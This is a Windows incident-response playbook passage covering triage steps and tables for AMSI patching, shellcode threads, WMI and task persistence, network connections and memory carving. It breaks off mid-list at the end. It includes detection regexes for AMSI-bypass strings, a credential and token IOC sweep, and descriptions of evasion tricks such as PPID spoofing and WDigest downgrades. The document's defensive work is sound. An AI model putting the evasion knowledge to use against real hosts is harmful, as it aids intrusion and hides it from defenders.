# Detailed Follow-On Investigation — Windows

Generic playbook for pivoting from IR Toolkit output into live-host triage.

> **Living document.** This guide is continuously revised as investigations surface new FP patterns, additional attack vectors, and investigative shortcuts. The long-term goal is for every section here to become an automated playbook step — commands, logic branches, and disposition rules encoded into the toolkit itself.

---

## How to use this guide

```
Step 1 — Read the toolkit reports
    reports\<host>\Memory_Findings_*.json        <- per-PID YARA + memory signals
    reports\<host>\Combined_Findings_*.json      <- cross-source adjudication
    reports\<host>\YARA_Pivot_Report.md          <- ranked TP-class PID list
    reports\<host>\Investigation_Plan_*.md       <- prioritised action list (if generated)

Step 2 — Pivot here
    For each Open/Suspicious item in the plan, find the matching section below.
    Run the commands on the target host (or remotely via Enter-PSSession).

Step 3 — Follow the rabbit hole
    Each section ends with a "what to do if suspicious" branch.
    Pursue those branches until you either close the finding as FP
    or collect enough evidence to escalate/remediate.

Step 4 — Document and close
    Append findings to Investigation_Notes_*.md in the report folder.
    Update the summary table disposition for each PID.
    Open items that need memory carve -> see Section 10.
```

---

## Prerequisites

- **Non-elevated session**: sufficient for WMI queries, process list, most event logs
- **Elevated session (admin)**: required for Security event log (4688), `auditpol`, memory carve tools
- Elevation pattern: write a script to disk, then `Start-Process pwsh -Verb RunAs -ArgumentList "-File <path>" -Wait`

---

## 1 — Triage Live Processes

Confirm whether flagged PIDs from the memory report are still running, and resolve their service names.

```powershell
# Check liveness
@(1234, 5678) | ForEach-Object {
    $p = Get-Process -Id $_ -ErrorAction SilentlyContinue
    if ($p) { "$_ : $($p.ProcessName) -- RUNNING" } else { "$_ : not found" }
}

# Resolve service(s) hosted in a svchost PID
Get-CimInstance Win32_Service | Where-Object { $_.ProcessId -eq 1234 } |
    Select-Object Name, DisplayName, State, StartMode, PathName

# Full svchost service map
Get-CimInstance Win32_Service |
    Where-Object { $_.ProcessId -gt 0 -and $_.PathName -match 'svchost' } |
    Sort-Object ProcessId | Format-Table ProcessId, Name, DisplayName, State
```

**Logic breakdown:**

| Result | What it means | Where to go next |
|--------|--------------|-----------------|
| PID not found (process exited) | Snapshot was taken after process died; service may have restarted under a new PID. Find it by service name. | `Get-Service <name>` to get new PID; correlate with memory image timestamp |
| PID alive, name matches | Finding is current; process still exploitable | Continue with Section 4/5 depending on signal type |
| PID is svchost — service list empty | Running as SYSTEM; non-admin session can't see the service | Elevate and re-run, or use `sc.exe query type= all state= running` |
| Service = WinRM / SessionEnv / TermService | Remote access surface — AMSI bypass or injection here is immediately exploitable by remote attackers | Escalate immediately; Section 20 (Eradication) |
| Service = wscsvc / SecurityHealthService | Security monitor itself is compromised | Escalate; other detections on this host may have been suppressed |
| Service = winmgmt (WMI) | WMI-hosted script execution is blind to AMSI | Check WMI subscriptions (Section 3) |
| DLL hint doesn't match live service name | Tool inferred wrong — the confirmed service name takes precedence; update investigation notes | Update notes; do not escalate based on the inferred name |

**Note:** Inferences about hosted services from DLL names (e.g., `wbemcomn.dll` -> WMI) should always be confirmed with the above query; they can be wrong.

---

## 2 — Process Creation Audit (requires admin)

Windows stores process creation in the Security event log (Event ID 4688).
PIDs in log messages are in **hex** — convert before searching.

```powershell
# Convert decimal PID to hex for log searching
'{0:X}' -f 1234    # example: 1234 -> 0x4D2
# Search pattern: "0x04D2" (zero-padded, case-insensitive in event messages)

# Pull events and search for a PID (by hex) — admin required
$hexPid = '0x{0:X}' -f <target_pid>
$hexPattern = $hexPid   # add more with | e.g. "0x1234|0x5678"
Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4688
    StartTime = (Get-Date).AddDays(-7)
} -MaxEvents 2000 | Where-Object { $_.Message -match $hexPattern } |
    ForEach-Object {
        $msg = $_.Message -replace '\s+',' '
        "[$($_.TimeCreated)] $($msg.Substring(0, [Math]::Min(600, $msg.Length)))"
    }
```

**Logic breakdown:**

| Result | What it means | Where to go next |
|--------|--------------|-----------------|
| Error / 0 results (non-admin) | **Security log silently returns 0 when read without admin — 0 hits does NOT mean no events exist.** Get-WinEvent -ErrorAction SilentlyContinue suppresses the access error. | Elevate, re-run; or write to Desktop script (Section 9) |
| 0 results (admin-elevated) | Event pre-dates log window, or log was cleared (check Section 16), or process creation auditing is off | `auditpol /get /subcategory:"Process Creation"` — if Not Configured, enable and note the gap |
| Event found, parent is expected | Normal creation, no spoofing | Close orphaned-parent signal as FP |
| Event found, parent is unexpected | PPID spoofing or lateral movement; real parent is in the event | Note original parent; correlate with that parent's own 4688 event |
| No 4688 events at all in log | Audit policy was disabled, or log was cleared | Check Section 16 (log health); treat as suspicious gap |
| `explorer.exe` parent is exited PID | `userinit.exe` always exits immediately after launching explorer — this is Windows design | Close "Orphaned Parent" for explorer.exe as toolkit FP |
| Log contains 0 entries total (log size full, oldest events gone) | Log rolled over — no retention | Note gap; check if evidence is in VSS shadow copy or SIEM |

**Critical:** Without admin, the Security log query returns 0 results with no error message when run with `-ErrorAction SilentlyContinue`. Always confirm log access by running a bare `Get-WinEvent -LogName Security -MaxEvents 1` — if it returns an authorization error, you need elevation.

**Gotchas:**
- Audit Policy must have "Process Creation: Success and Failure" enabled (check with `auditpol /get /subcategory:"Process Creation"` — requires admin)
- Security log may roll over quickly on active systems; zero hits does not equal no evidence
- `explorer.exe` PPID is always `userinit.exe` which exits by design — "Orphaned Parent" for explorer.exe is a toolkit FP
- PPID spoofing (T1134.004 Argue) would appear as a parent PID pointing to a DIFFERENT process than the one that created the child

---

## 3 — WMI Persistence Check

WMI event subscriptions (`__EventFilter` + `__EventConsumer` + `__FilterToConsumerBinding`) survive reboots and execute in the context of the WMI service. Check before anything else if WMI signals are present.

```powershell
# Enumerate all three subscription classes
Get-CimInstance -Namespace root\subscription -ClassName __EventFilter |
    Select-Object Name, Query, QueryLanguage, EventNamespace | Format-Table -Wrap

Get-CimInstance -Namespace root\subscription -ClassName __EventConsumer |
    Select-Object * | Format-List

Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding |
    Select-Object Filter, Consumer | Format-Table -Wrap
```

**Legitimate baseline:** Windows ships with one subscription: `SCM Event Log Filter` -> `SCM Event Log Consumer` (Service Control Manager). Any other subscription is worth reviewing.

```powershell
# WMI Activity log — check for unusual ExecMethod or CreateInstance operations
Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-WMI-Activity/Operational'
    StartTime = (Get-Date).AddHours(-48)
} -MaxEvents 200 | Where-Object { $_.Id -in @(5858, 5860) } |
    ForEach-Object { "[$($_.TimeCreated)] Id=$($_.Id) $($_.Message -replace '\s+',' ')" }
```

**Logic breakdown:**

| Result | What it means | Where to go next |
|--------|--------------|-----------------|
| Only `SCM Event Log Filter` subscription found | Standard Windows baseline — clean | No action |
| Any subscription other than SCM | Persistence mechanism; inspect consumer type and query | `Get-CimInstance -Namespace root\subscription -ClassName __EventConsumer` for execution target; `Get-CimInstance -ClassName __EventFilter` for trigger condition |
| Consumer type = `CommandLineEventConsumer` | Executes a command on trigger — highest risk pattern | Record command line; pivot to Section 14 (parent-child); proceed to Section 20 |
| Consumer type = `ActiveScriptEventConsumer` | Executes VBScript/JScript inline — high risk | Capture script text; check for download/exec pattern |
| Consumer type = `LogFileEventConsumer` | Writes to a file on trigger — low risk | Inspect destination file path for staged payload |
| 5858/5860 events: `ClientProcessId` is SecurityHealthService | Defender polling WMI security state — normal | Close as FP |
| 5858 events: provider `MSFT_NetFirewallHyperVRule`, `0x80041002` errors | WSL service cleaning up Hyper-V firewall rules that don't exist | Close as FP if PID is wslservice |
| 5858 events with `Win32_DeviceGuard`, `0x80041032` | Defender checking HVCI/VBS on system where it isn't enabled | Close as FP |
| 5860 events from unexpected PID | External code triggering WMI exec via event system | Identify PID, correlate with persistence subscription; escalate if unknown |

**Interpreting WMI callers:**
- PID in `ClientProcessId` — check what that process is
- `nettcpip` provider loading every ~2 minutes is typically SecurityHealthService polling network state
- PID managing `MSFT_NetFirewallHyperVRule` is typically wslservice (WSL networking)
- High-frequency `Win32_DeviceGuard` queries returning `0x80041032` (provider not available) = Windows Security Service checking HVCI — normal

---

## 4 — AMSI In-Memory Patch Investigation

`SUSP_Fake_AMSI_DLL_Jun23_1` matching in a file-backed `amsi.dll` region with non-standard `-wx` permissions is the key signal. Normal loaded DLL pages are `r-x`; write perms indicate CoW modification.

**Step 1: Confirm the service context of the flagged svchost**
```powershell
Get-CimInstance Win32_Service | Where-Object { $_.ProcessId -eq <PID> } |
    Select-Object Name, DisplayName, PathName
```

**Step 2: Get the on-disk DLL hash as a reference point**
```powershell
Get-FileHash "C:\Windows\System32\<flagged_dll>.dll" -Algorithm SHA256
(Get-Item "C:\Windows\System32\<flagged_dll>.dll").VersionInfo | Select-Object FileVersion, ProductVersion
```

**Step 3: Compare in-memory DLL to on-disk (requires memory toolkit / admin)**
If the toolkit has a module-dump capability, extract the in-memory DLL from the flagged PID and compare its hash against the on-disk hash. A mismatch confirms in-memory patching.

**Step 4: Look for Script Block logging gaps**
```powershell
# Event 4104 - Script Block Logging (no admin needed)
Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-PowerShell/Operational'
    Id = 4104
    StartTime = (Get-Date).AddHours(-48)
} -MaxEvents 500 | Where-Object {
    $_.Message -match '(?i)(amsi|AmsiScanBuffer|bypass|disable.*scan|patch.*amsi)'
} | Select-Object TimeCreated, Message
```
If AMSI bypass was active in PowerShell, expect gaps in 4104 logging or AMSI-related strings.

**Understanding the `-wx` notation:**
```
r = readable  w = writable  x = executable  - = not set
Normal DLL code page: r-x
CoW-patched page:     rw- or -wx depending on tool representation
```
File-backed pages with write permissions in a DLL's executable range almost always indicate either CoW (the OS gave this process a private copy and it was written) or a direct `VirtualProtect + WriteProcessMemory` pattern.

**Logic breakdown — AMSI investigation:**

| Result | What it means | Where to go next |
|--------|--------------|-----------------|
| `SUSP_Fake_AMSI_DLL` fires on every process that loads amsi.dll | The YARA rule matches a byte pattern that appears in the legitimate AMSI DLL; likely FP for this environment | Confirm by checking how many distinct PIDs load amsi.dll via `Get-Process | ForEach {$_.Modules -match 'amsi.dll'}` — if rule fires on ALL of them, it's probably a YARA FP |
| `SUSP_Fake_AMSI_DLL` fires on only 1-2 svchost PIDs (not all amsi.dll loaders) | High specificity — suggests those specific processes have a modified amsi.dll in memory | Proceed to in-memory hash comparison (Step 3) |
| In-memory hash matches on-disk hash | amsi.dll not patched in that process; find another explanation for the YARA hit | Downgrade finding; note the investigation path |
| In-memory hash differs from on-disk hash | amsi.dll pages are modified in memory — confirmed AMSI bypass | True Positive; correlate with network connections (Section 7), process handles (Section 12), Section 20 |
| Service = WinRM / WMI / Security Center | These services inspect or mediate security content — AMSI bypass here is highest-impact | Escalate immediately regardless of hash comparison result |
| 4104 Script Block Logging: gaps or 0 entries | AMSI bypass actively suppressing PS logging, OR no PowerShell activity in that window | If AMSI bypass is confirmed and SBL is empty for the period, treat as intentional suppression |
| 4104 Script Block Logging: AMSI-related strings found | Bypass attempt logged (bypass failed or partially failed) | Capture the script block; pivot to payload analysis (Section 10/11) |

**Critical AMSI note:** The `-wx` permission on a file-backed DLL page means the OS granted this process a private writable copy (CoW) of that page AND it was written to. For system DLLs, this should never happen normally. However, `-wx` alone (without `SUSP_Fake_AMSI_DLL`) in common DLLs like `shlwapi.dll`, `capauthz.dll`, `CRYPT32.dll`, and `cryptnet.dll` appears across virtually every process on a Windows system — those are LOLBin YARA string FPs in commonly loaded networking/crypto DLLs. The AMSI rule is more specific and only fires on actual amsi.dll byte sequences.

**High-risk service combinations for AMSI bypass:**

| Service | Why it matters |
|---------|---------------|
| WinRM / wsmanhost | Remoting execution bypasses AMSI in that host |
| winmgmt (WMI) | WMI script consumers bypass AMSI |
| wscsvc (Windows Security Center) | The security monitor itself is blinded |
| DoSvc (Delivery Optimization) | Content received for updates bypasses AMSI scan |
| lsass | Credential operations bypass hook |

---

## 5 — Shellcode Thread Investigation

A thread whose start address falls outside all loaded modules is a strong injection indicator. The toolkit reports this as `Shellcode Thread (Memory)`.

```powershell
# Identify the module (or lack thereof) at a given address in a live process
# This requires a kernel-mode tool or the memory image carve path

# Manual approximation: list loaded modules for the process and check address range
$proc = Get-Process -Id <PID>
$proc.Modules | Sort-Object BaseAddress | ForEach-Object {
    $base = [long]$_.BaseAddress
    $end  = $base + $_.ModuleMemorySize
    "$("{0:X16}" -f $base) - $("{0:X16}" -f $end)  $($_.ModuleName)"
}
# If the thread start address falls in none of these ranges -> outside all loaded modules
```

**Interpreting the result:**
- Address in `anon rwx` or `anon r-x` VAD = shellcode in anonymous executable memory = high confidence injection
- Address in file-backed region not in module list = module may have been unloaded after thread creation (cover tracks)
- Address > 0x7FFE0000000 = very high user-mode range; note whether this is a 32-bit or 64-bit process (affects valid module range)

**Logic breakdown — shellcode thread:**

| Result | What it means | Where to go next |
|--------|--------------|-----------------|
| Thread start in `anon rwx` VAD | Classic shellcode injection — anonymous memory was made executable and jumped to | True Positive; proceed to memory carve (Section 10), then enrichment (Section 11) |
| Thread start in `anon r-x` VAD | Executable anonymous memory, write perms already removed (cover tracks) | Still strong injection indicator; carve the region before perms change again |
| Thread start in `anon ---` VAD | Decommitted memory — thread start address was in a region that has since been freed | Check if thread is still running; if so, process memory may have been rearranged; carve adjacent regions |
| Thread start in a file-backed region, but that module is NOT in Get-Process .Modules | Module was unloaded after thread started (cover tracks by unmapping payload DLL) | Identify the file by address range in the memory image; look for MZ header at region start |
| Thread start in a file-backed region, module IS in Get-Process .Modules | Normal — thread is in a loaded DLL; check if that DLL is expected and signed | `sigcheck64.exe` the DLL; if unsigned or unsigned path = Section 19 |
| Process refuses to show modules (access denied) | svchost/SYSTEM process, non-admin session | Elevate; or use `vol.exe windows.dlllist --pid <N>` against the AFF4 image |
| Shellcode thread + zero established connections | Implant not actively beaconing at time of check; may be sleeping, single-fire, or use non-TCP comms | Do NOT close as FP based on no connections alone; check handles (Section 12 handle64), then carve |
| No modules at all listed | Process terminated between capture and live check | Work from the AFF4 image exclusively (Section 10) |

**PPID anomaly context:**
- `userinit.exe` exits after starting `explorer.exe` — orphaned parent for explorer = FP
- `cmd.exe` / `powershell.exe` spawned as children of a short-lived `wscript.exe` or `mshta.exe` = suspicious
- For all other processes: orphaned parent warrants checking the process tree at the time of capture

---

## 6 — Scheduled Task Review

Especially relevant when WiltedTulip (OilRig/APT34) or other task-persistence rules fire, or as a general persistence sweep.

```powershell
# Export all scheduled tasks with full detail
Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' } |
    ForEach-Object {
        $t = $_
        $actions = $t.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments)" }
        [pscustomobject]@{
            TaskPath    = $t.TaskPath
            TaskName    = $t.TaskName
            State       = $t.State
            Author      = ($t.Principal.UserId)
            Actions     = ($actions -join '; ')
            LastRunTime = ($t.LastRunTime)
            NextRunTime = ($t.NextRunTime)
        }
    } | Sort-Object TaskPath | Format-Table -Wrap

# Filter for recently created tasks (check registration date)
Get-ScheduledTask | ForEach-Object {
    $info = $_ | Get-ScheduledTaskInfo -ErrorAction SilentlyContinue
    if ($info -and $info.LastRunTime -gt (Get-Date).AddDays(-7)) {
        "$($_.TaskPath)$($_.TaskName)  LastRun=$($info.LastRunTime)"
    }
}

# Check for tasks not backed by a registered task file (orphaned COM task objects)
Get-ChildItem 'C:\Windows\System32\Tasks' -Recurse -File | ForEach-Object {
    $xml = [xml](Get-Content $_.FullName)
    $action = $xml.Task.Actions.Exec
    if ($action) {
        [pscustomobject]@{
            File    = $_.FullName
            Command = $action.Command
            Args    = $action.Arguments
        }
    }
}
```

**Logic breakdown — scheduled tasks:**

| Result | What it means | Where to go next |
|--------|--------------|-----------------|
| Task in `\Microsoft\` namespace | Likely legitimate Windows or MS product task | Spot-check if the action command path looks unexpected (e.g., `%TEMP%`, `%APPDATA%`) |
| Task in non-Microsoft namespace (Adobe, NVIDIA, Google, ASUS, etc.) | Third-party software — check action executable is signed and at expected path | `sigcheck64.exe <action_exe>` to verify |
| Task in `\SoftLanding\<SID>\` | Microsoft Advertising SDK — COM handler tasks for Windows ad/notification system | Legitimate Windows infrastructure; note the COM CLSID if desired for tracking |
| Task action is a COM handler (no `.Execute` path shown) | Action runs via COM CLSID — harder to inspect than a plain executable | Look up the CLSID in HKLM:\SOFTWARE\Classes\CLSID\{...} to identify the implementing DLL |
| Task action has empty `.Execute` field but task ran recently | COM-object-only task; may be legitimate or may be persistence via a registered COM object | Inspect CLSID; run with Sysinternals Autoruns (Section 12) to resolve COM handlers |
| Task action runs script interpreter (PowerShell, cmd, cscript) with a path in Temp/AppData | High suspicion — not a pattern for legitimate Windows tasks | Extract and examine the script; pivot to Section 10/11 |
| Task author is empty, SID-only security descriptor | Created programmatically (common for ASUS, SoftLanding, Windows internal tasks) | Not suspicious alone; compare against task actions |
| Task registered date < 7 days / after known compromise window | Freshly created persistence | Escalate; record creation timestamp from `$_.Date` property |
| Prefetch empty (0 .pf files, EnablePrefetcher=3) | Prefetch enabled but no files — may indicate a cleaner tool ran, or system is VM/NVMe with ReadyBoot disabled | Check for CCleaner, BleachBit, or other cleaners in Run keys / Amcache |

---

## 7 — Network Connection Triage

```powershell
# Current TCP connections with owning process
Get-NetTCPConnection -State Established |
    ForEach-Object {
        $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
        [pscustomobject]@{
            Local      = "$($_.LocalAddress):$($_.LocalPort)"
            Remote     = "$($_.RemoteAddress):$($_.RemotePort)"
            State      = $_.State
            PID        = $_.OwningProcess
            Process    = $proc.ProcessName
            Path       = $proc.Path
        }
    } | Sort-Object Remote | Format-Table -Wrap

# DNS cache — recently resolved names (shows what processes have been talking to)
Get-DnsClientCache | Sort-Object TTL | Format-Table -Wrap

# Listening ports — potential backdoors
Get-NetTCPConnection -State Listen |
    ForEach-Object {
        $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
        [pscustomobject]@{
            LocalPort = $_.LocalPort
            PID       = $_.OwningProcess
            Process   = $proc.ProcessName
            Path      = $proc.Path
        }
    } | Sort-Object LocalPort | Format-Table
```

**Logic breakdown — network connections:**

| Result | What it means | Where to go next |
|--------|--------------|-----------------|
| Flagged PID has zero established connections | No active C2 at this moment — does NOT clear the finding; beacon may be sleeping, or used a single one-shot connection | Check handles (Section 12 `handle64`) for pipe/socket handles; check DNS cache for recently resolved names |
| Flagged PID connects to a non-standard port (non-80/443) | Strong indicator of C2 or exfil — beacons rarely use standard service ports | Capture IP + port; run offline GeoIP lookup (Section 11); submit IP to VT |
| Flagged PID connects to port 443 but IP is not CDN/cloud | C2 over HTTPS — check if there's a corresponding DNS cache entry with a matching domain | `Get-DnsClientCache` to find hostname; submit to VT; check SSL cert via openssl if tools available |
| Listening port on unexpected process | Backdoor or lateral movement listener | `netstat -ano` as admin for full picture; correlate PID; check if port was open before infection window |
| DNS cache has unusual or non-ASCII domain recently resolved | Possible DGA (Domain Generation Algorithm) C2 or exfil DNS | Inspect domain; submit to VT or passive DNS; correlate with first-seen timeline (Section 11) |
| RPCSS listening on port 135 | Standard RPC endpoint mapper — always present | Close as FP |
| RDP port 3389 or WinRM 5985/5986 listening | Remote access surface is open | Cross-check Section 19; confirm authorised and expected |
| Connections from AdobeCollabSync to local subnet IPs | Local collaboration discovery (mDNS/Bonjour-style, normal for Adobe collab) | Check if any connections go to non-local (public) IPs; if only LAN = FP |

---

## 8 — Persistence Locations Quick-Sweep

```powershell
# Run keys (HKCU and HKLM)
@(
    'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
    'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
    'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
    'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce'
) | ForEach-Object {
    Write-Host "`n=== $_ ==="
    Get-ItemProperty $_ -ErrorAction SilentlyContinue | Format-List
}

# Services with non-standard binary paths
Get-CimInstance Win32_Service |
    Where-Object { $_.PathName -notmatch '^"?C:\\Windows\\' -and $_.State -eq 'Running' } |
    Select-Object Name, DisplayName, PathName, State | Format-Table -Wrap

# Winlogon notification packages / LSA providers
Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' |
    Select-Object 'Authentication Packages', 'Security Packages', 'Notification Packages'
```

**Logic breakdown — persistence locations:**

| Result | What it means | Where to go next |
|--------|--------------|-----------------|
| Run key entry with a signed binary at expected path | Legitimate installed software | No action; note for baseline |
| Run key entry pointing to `%TEMP%`, `%APPDATA%\Roaming`, `C:\Users\Public` | High suspicion — legitimate software does not auto-start from temp/public dirs | Extract binary; Section 19 signature check; Section 10/11 memory analysis if PID is running |
| Run key entry for a binary you don't recognise | Potentially malicious; could be legitimate installer residue | `sigcheck64.exe` against the binary path; check Amcache for first-seen date (Section 15) |
| AdobeCollabSync in HKCU Run | Legitimate — Adobe Acrobat installs this so the collab service starts at login | Close as FP; confirms AdobeCollabSync is an installed component |
| Non-standard service binary path (not under `C:\Windows\`) | Could be a rogue service install | Check signature and file hash; correlate with Event 7045 (new service installed) in System log |
| LSA Authentication Packages contains anything beyond `msv1_0` | Non-standard authentication provider — may be credential capture DLL | Identify the DLL; compare to Microsoft baseline; Section 13 (credential access) |
| LSA Security Packages contains an unfamiliar entry | Same pattern; LSA providers load in lsass space = credential capture surface | Treat as high-severity if unrecognised |
| WDigest `UseLogonCredential = 1` | Attacker forced plaintext credentials into memory | Immediate escalation; credential re-use likely; Section 13 |

---

## 9 — Admin Elevation Pattern

When a check requires elevation, avoid multiple UAC prompts by batching into one script:

```powershell
# 1. Write the investigation script
Set-Content 'C:\Users\<user>\Desktop\admin_checks.ps1' @'
<your commands here>
<results> | Out-File 'C:\Users\<user>\Desktop\admin_results.txt' -Encoding UTF8
'@

# 2. Elevate and wait
$proc = Start-Process pwsh -Verb RunAs `
    -ArgumentList "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-File", "C:\Users\<user>\Desktop\admin_checks.ps1" `
    -PassThru -Wait
Write-Host "Exit: $($proc.ExitCode)"

# 3. Read results
Get-Content 'C:\Users\<user>\Desktop\admin_results.txt'
```

**Logic breakdown — admin elevation:**

| Result | What it means | Where to go next |
|--------|--------------|-----------------|
| Exit code 0, output file populated | Script ran successfully as admin | Read results; proceed with the section that triggered the elevation |
| Exit code 1, output file empty or partial | Admin script hit a terminating error | Add `try { ... } catch { $_ | Out-File ... }` around commands; re-run |
| UAC prompt rejected / no prompt appears | User denied elevation, or UAC is disabled | Check if another elevation path exists (WinRM session already elevated, RDP admin session) |
| `-Wait` returns immediately, output missing | PowerShell spawned but exited before `-Wait` could track it | Remove `-PassThru -Wait`; instead poll for the output file with `while (-not (Test-Path <outfile>)) { Start-Sleep 1 }` |
| Output file exists but results are wrong user context | Script ran as another user (elevation to a different admin account) | Verify `$env:USERPROFILE` in the elevated script resolves to the correct home directory |

**Pitfalls:**
- Do NOT use `@' ... '@` (here-string) with variable expansion inside `-ArgumentList` — use `-File` with an on-disk script to avoid quoting issues
- Base64 `-EncodedCommand` works for simple commands but the encoding step itself can introduce errors with complex scripts; prefer the `-File` approach
- The elevated session runs as the same user with an elevated token, so `$env:USERPROFILE` resolves correctly
- Output to `C:\Temp` requires the directory to exist; user's Desktop is a guaranteed writable path

---

## 10 — Memory Carve (VAD address / in-memory hash)

> **Canonical reference:** `WORKFLOW-WINDOWS.md` Phase 3 is the authoritative pipeline document for memory analysis. This section summarises the carve step; see that file for full `Analyze-Memory.ps1` parameter reference, engine routing (AFF4 -> MemProcFS, raw/dmp -> Volatility 3), and Binary Ninja carve workflow.

When carve is needed to confirm a shellcode thread address or an in-memory DLL patch:

```powershell
# Primary path: AFF4 image (go-winpmem capture) via MemProcFS
# -Carve writes injected Private+exec regions to tools\binja\data\<stamp>\ as .bin + .json sidecar
# -Adjudicate merges Memory_Findings into Combined_Findings and re-runs adjudication
.\playbooks\windows\threat_hunting\Analyze-Memory.ps1 `
    -ImagePath ".\reports\<host>\memory_<host>.aff4" `
    -OutputDir ".\reports\<host>" `
    -Carve -Adjudicate

# Targeted carve: Volatility 3 vadinfo for a specific PID (when validating a thread start address)
.\tools\vol.exe -f ".\reports\<host>\memory_<host>.aff4" windows.vadinfo --pid <PID>

# Confirm in-memory DLL hash (on-disk baseline vs. memory dump):
$onDisk = (Get-FileHash 'C:\Windows\System32\<module>.dll' -Algorithm SHA256).Hash
# After Analyze-Memory.ps1 -Carve dumps the module:
$inMem  = (Get-FileHash ".\reports\<host>\<module>_pid<PID>.bin" -Algorithm SHA256).Hash
if ($onDisk -ne $inMem) { "MISMATCH: module is patched in memory" }
```

**Logic breakdown — VAD type for shellcode thread:**

| VAD result for thread start address | What it means | Where to go next |
|-------------------------------------|--------------|-----------------|
| `anon rwx` (anonymous + read/write/exec) | Classic shellcode injection — code is sitting in anonymous executable memory | True Positive; proceed to Section 11 enrichment; carve the region |
| `anon r-x` (anonymous + exec, no write) | Write perms removed after injection to cover tracks | Still strong injection indicator; carve immediately before perms change |
| `anon r--` or `anon rw-` (anonymous, NOT executable) | Data/heap region — not a code-execution context | FP for shellcode injection; note for data exfil potential; downgrade |
| `anon ---` (decommitted) | Thread start address was freed after thread started; timing artifact | Confirm thread is still running; if process exited, close as timing FP |
| File-backed, `r-x`, module IS in process module list | Normal DLL code page — thread is in a legitimate loaded module | Check if the DLL is signed (Section 19); if signed and expected = FP |
| File-backed, module NOT in process module list | Module was unloaded after thread started to hide tracks | High suspicion — search image for MZ header at that address; carve |
| File-backed with `rw-` or `-wx` permissions | CoW modification — the OS gave this process a writable private copy AND it was written | Same AMSI pattern (Section 4); check if the DLL is amsi.dll or another hook target |
| Address in very high range (> `0x7FFE0000000`) | Kernel/user boundary region — only valid for specific Windows shared data structures | Confirm against known Windows KUSER_SHARED_DATA / KPROCESS_SHARED ranges; FP if matching |

**Interpreting the carve sidecar:**
Each carved `.json` sidecar has `injected: true/false`. Regions with `injected: true` are Private + exec (no file backing) — treat as live malware bytes. Regions with `injected: false` are file-backed (rule grazed a loaded DLL); verify the DLL's signature rather than treating the carved bytes as shellcode.

---

## 11 — Memory Enrichment (eradication scope)

> **Canonical references:**
> - `WORKFLOW-WINDOWS.md` Phase 3b — authoritative enrichment pipeline, exact command syntax, and per-PID verdict table.
> - `WORKFLOW-INVESTIGATION-WINDOWS.md` — per-module TP/FP decision logic (Steps 1-6: IOC triage, geo, config DNA, YARA pivot, chain reconstruction, corroboration).
> These two files are the definitive guide. The section below is a quick-reference summary.

After carve confirms a true positive, run the enrichment engine to build the full implant footprint before eradication. This is a separate step from the initial YARA scan — it opens the memory image with MemProcFS and extracts everything the implant touched.

**What the enrichment engine recovers (from `memory_enrich.py`):**

| Layer | What it finds |
|-------|--------------|
| **Handles** | Dropped files (Temp/Public paths), registry persistence (Run/IFEO/ServiceDll keys), implant mutex names (bare high-entropy tokens), named pipes / ALPC (C2 IPC channels) |
| **Injected regions** | Private+executable VADs not backed by any loaded module — carved, analyzed with capa and FLOSS |
| **capa** | Capability fingerprint of the carved shellcode: `encrypt data via RC4`, `create TCP socket`, `inject into process`, etc. — with ATT&CK technique IDs |
| **FLOSS** | Deobfuscated strings that plain `strings` misses: stack strings, decoded strings, tight-loop decoded blobs — catches XOR/RC4 config encodings |
| **IOC sweep** | IPs, domains, URLs (ASCII + UTF-16LE), stratum mining pool C2, Tor .onion, Monero wallets, AWS keys, Telegram bot tokens, Discord webhooks, private-key blocks — extracted from carved bytes and private data regions |
| **Config DNA** | HTTP beacon URI templates (`/gate.php?bid=%08x`), custom User-Agent headers, bot parameters (bid/uid/campaign), USB worm markers (autorun.inf/recycler/xcopy) |
| **Decode candidates** | Base64 and hex blobs pre-filtered by entropy, ready to paste into CyberChef (Magic recipe → From Base64 / From Hex / Gunzip / XOR / RC4 as the data suggests) |
| **Network** | Live TCP sockets from the image netscan → C2 destination IPs |
| **Offline geo** | Country-of-origin for each IP from db-ip.com Country Lite (no network calls) — `KR (South Korea)`, `RU (Russia)`, etc. |
| **First-seen timeline** | Implant first-ran time from injected-thread create time (more accurate than process create for svchost/explorer injection) correlated against USB device first-connect times to test the entry vector |
| **Attack chain** | Mermaid flowchart: parent → implant PID → children → dropped files → registry → mutex → C2 — appended to `Attack_Graph.md` |

**Running the enrichment:**

```powershell
# Stage optional static analysis tools first (one-time, offline)
.\Build-OfflineToolkit.ps1 -IncludeCapa       # capa.exe -> tools\capa\
.\Build-OfflineToolkit.ps1 -IncludeFloss      # floss.exe -> tools\floss\
.\Build-OfflineToolkit.ps1 -IncludeGeoIP      # db-ip country lite -> tools\geoip\

# Python interpreter bundled with the toolkit (do NOT use bare 'python' or system Python)
$py = ".\tools\memprocfs\python\python.exe"

# Run enrichment against the captured image for the confirmed TP PIDs
# PIDs are a comma-separated list with no spaces
& $py .\playbooks\windows\threat_hunting\memory_enrich.py `
    ".\reports\<host>\memory_<host>.aff4" `
    ".\reports\<host>" `
    <pid1>,<pid2>,<pid3>

# After collecting USB device history live on the host, correlate entry vector:
& $py .\playbooks\windows\threat_hunting\memory_enrich.py `
    --correlate ".\reports\<host>"
```

**Outputs written to `reports/<hostname>/`:**

```
Memory_Enrichment_<ts>.json   <- full per-PID dossier + rolled-up eradication IOC bundle
Memory_Enrichment.md          <- analyst worksheet: IOCs (defanged), capa results,
                                  FLOSS deobfuscated strings, CyberChef decode candidates
Attack_Graph.md               <- memory-derived attack chain appended (mermaid)
Timeline_Correlation.md       <- RAM first-seen vs USB first-connect timeline
IOCs.json                     <- updated: C2 IPs/domains added, memory_eradication block populated
```

**CRITICAL: Review IOCs.json before any eradication run**

The enrichment engine auto-promotes every domain and URL it recovers from process memory into `c2_endpoints[]` in `IOCs.json` without threat scoring. This includes:
